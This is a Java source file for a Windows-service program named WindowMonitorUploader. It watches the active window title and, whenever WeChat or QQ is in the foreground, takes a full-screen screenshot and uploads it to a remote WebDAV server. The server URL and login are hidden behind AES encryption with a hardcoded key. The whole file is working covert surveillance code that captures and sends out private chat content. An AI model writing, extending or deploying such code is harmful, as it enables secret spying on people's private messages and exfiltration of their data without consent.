/*
 * Copyright (c) 2025 unknowIfGuestInDream.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *     * Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *     * Neither the name of unknowIfGuestInDream, any associated website, nor the
 * names of its contributors may be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL UNKNOWIFGUESTINDREAM BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package com.tlcsdm.windowmonitor;

import com.github.sardine.Sardine;
import com.github.sardine.SardineFactory;
import com.sun.jna.Native;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.ptr.IntByReference;

import javax.crypto.SecretKey;
import javax.imageio.ImageIO;
import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

/**
 * @author unknowIfGuestInDream
 */
public class WindowMonitorUploader {

    private static final String FIXED_KEY_STR = "tLcsdMwIndoWmOnt";
    private static String WEBDAV_URL = "cN2tIFNhoFyjJ44hmiYoyWKtJEbDF0HMquNp0XX98DM=";
    private static final String USERNAME = "DVlKm5MyVy9+MVLS7wTVHhx6gVPPLfi6YqM0P3oP9KQ=";
    private static final String PASSWORD = "jg8PewVdbl3x1KDrc24iwBhvVutacFQFq6MQaxt807PTn0gaMhrLNPqUt1kLi+Bb";
    private static final String MATCH_KEYWORD_1 = "\u5fae\u4fe1";
    private static final String MATCH_KEYWORD_2 = "QQ";
    private static final long interval = 2000;

    /** Log file placed next to the running jar so it is writable from a service. */
    private static final String LOG_FILE = "windowmonitor.log";

    public static void main(String[] args) throws Exception {
        // Ensure AWT is not treated as headless even in service environments.
        System.setProperty("java.awt.headless", "false");

        int sessionId = getCurrentSessionId();
        log("WindowMonitor starting. Windows Session ID: " + sessionId);
        if (sessionId == 0) {
            log("WARNING: Running in Session 0 (service isolation session). " +
                    "GetForegroundWindow() will return null and Robot cannot capture the screen. " +
                    "Run configure-service.ps1 to change the service logon account to a real user.");
        }

        SecretKey key = AesUtil.getFixedKey(FIXED_KEY_STR);
        WEBDAV_URL = AesUtil.decrypt(WEBDAV_URL, key);
        Sardine sardine = SardineFactory.begin(AesUtil.decrypt(USERNAME, key), AesUtil.decrypt(PASSWORD, key));
        while (true) {
            try {
                String title = getActiveWindowTitle();
                if (!title.isEmpty()) {
                    log("Active window: " + title);
                }
                if (title.contains(MATCH_KEYWORD_1)) {
                    uploadImage(sardine, "wechat");
                } else if (title.contains(MATCH_KEYWORD_2)) {
                    uploadImage(sardine, "qq");
                }
                Thread.sleep(interval);
            } catch (Exception e) {
                log("Error in main loop: " + e.getMessage());
                e.printStackTrace();
            }
        }
    }

    private static void uploadImage(Sardine sardine, String prefix) throws Exception {
        BufferedImage screenshot = takeFullScreenshot();
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy_MM_dd_HHmmss"));
        String dateCary = LocalDate.now().format(DateTimeFormatter.ofPattern("yyyyMMdd"));
        String fileName = prefix + "_" + timestamp + ".png";
        // 将截图写入 ByteArrayOutputStream
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(screenshot, "png", baos);
        baos.flush();
        byte[] imageData = baos.toByteArray();
        baos.close();
        // 直接使用 byte[] 上传文件
        sardine.put(WEBDAV_URL + dateCary + "/" + fileName, imageData);
        log("Uploaded: " + fileName);
    }

    /**
     * Returns the title of the foreground window.
     *
     * <p>When the JVM runs inside a Windows service (Session 0),
     * {@link User32#GetForegroundWindow()} returns {@code null} because Session 0
     * has no interactive desktop.  In that case this method returns an empty string
     * and a warning is logged.  The fix is to configure the Windows service to log on
     * as a real user account via {@code configure-service.ps1}.
     */
    private static String getActiveWindowTitle() {
        WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
        if (hwnd == null) {
            // Running in Session 0 (service isolation): no foreground window is available.
            // Screenshots cannot be captured until the service is reconfigured to run as
            // a real user account with an interactive desktop session.
            return "";
        }
        char[] buffer = new char[1024];
        int len = User32.INSTANCE.GetWindowText(hwnd, buffer, buffer.length);
        if (len <= 0) {
            return "";
        }
        return Native.toString(buffer);
    }

    /**
     * Returns the Windows session ID for the current process.
     * A session ID of {@code 0} means the process is running in the non-interactive
     * service isolation session (Session 0), where desktop access is unavailable.
     */
    private static int getCurrentSessionId() {
        try {
            IntByReference sessionId = new IntByReference();
            Kernel32.INSTANCE.ProcessIdToSessionId(
                    Kernel32.INSTANCE.GetCurrentProcessId(), sessionId);
            return sessionId.getValue();
        } catch (Exception e) {
            return -1;
        }
    }

    /**
     * 截全屏
     */
    private static BufferedImage takeFullScreenshot() throws Exception {
        try {
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            return new Robot().createScreenCapture(screenRect);
        } catch (AWTException e) {
            log("AWTException during screenshot — likely running in Session 0 without desktop access. " +
                    "Run configure-service.ps1 to fix this. Error: " + e.getMessage());
            throw e;
        }
    }

    /**
     * 截取窗口
     */
    private static BufferedImage takeWindowScreenshot() throws Exception {
        WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
        if (hwnd == null) {
            throw new IllegalStateException(
                    "No foreground window available — running in Session 0 without desktop access.");
        }
        WinDef.RECT rect = new WinDef.RECT();
        User32.INSTANCE.GetWindowRect(hwnd, rect);
        Rectangle captureRect = new Rectangle(rect.left, rect.top,
                rect.right - rect.left, rect.bottom - rect.top);
        return new Robot().createScreenCapture(captureRect);
    }

    /**
     * Appends a timestamped message to the log file next to the running jar.
     * Errors during logging are silently ignored so that logging never disrupts
     * the main monitoring loop.
     */
    private static void log(String message) {
        String line = LocalDateTime.now()
                .format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"))
                + " " + message;
        System.out.println(line);
        try {
            Path logPath = Paths.get(LOG_FILE).toAbsolutePath();
            // Rotate log file when it exceeds 10 MB to avoid unbounded growth
            if (Files.exists(logPath) && Files.size(logPath) > 10 * 1024 * 1024) {
                Files.move(logPath, Paths.get(LOG_FILE + ".bak"),
                        java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            }
            try (PrintWriter pw = new PrintWriter(new FileWriter(logPath.toFile(), true))) {
                pw.println(line);
            }
        } catch (IOException ignored) {
            // Do not let logging failures affect the main loop
        }
    }
}
